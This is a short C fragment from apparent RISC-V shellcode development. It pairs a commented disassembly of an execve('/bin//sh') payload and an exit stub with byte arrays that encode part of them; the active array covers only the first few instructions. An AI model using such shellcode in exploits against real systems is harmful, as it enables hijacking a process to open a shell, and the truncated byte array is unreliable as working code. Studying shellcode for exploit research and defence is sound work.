/*
0000000000010078 <_start>:
   10078:	6e696537          	lui	a0,0x6e696
   1007c:	22f5051b          	addiw	a0,a0,559
   10080:	1161                	addi	sp,sp,-8
   10082:	e02a                	sd	a0,0(sp)
   10084:	00687537          	lui	a0,0x687
   10088:	32f5051b          	addiw	a0,a0,815
   1008c:	00a13223          	sd	a0,4(sp)
   10090:	4501                	li	a0,0
   10092:	00010513          	mv	a0,sp
   10096:	4601                	li	a2,0
   10098:	4581                	li	a1,0
   1009a:	0dd00893          	li	a7,221
   1009e:	00000073          	ecall
   100a2:	4501                	li	a0,0
   100a4:	05d00893          	li	a7,93
   100a8:	00000073          	ecall
 */

/*
0000000000012000 <code>:
   12000:       4501                    li      a0,0
   12002:       4881                    li      a7,0
   12004:       05d88893                addi    a7,a7,93
   12008:                       ecall

 */
//unsigned char code[] = "\x01\x45\x81\x48\x93\x88\xd8\x05\x73";
unsigned char code[] = "\x37\x65\x69\x6e\x1b\x05\xf5\x22\x61\x11\x2a\xe0";
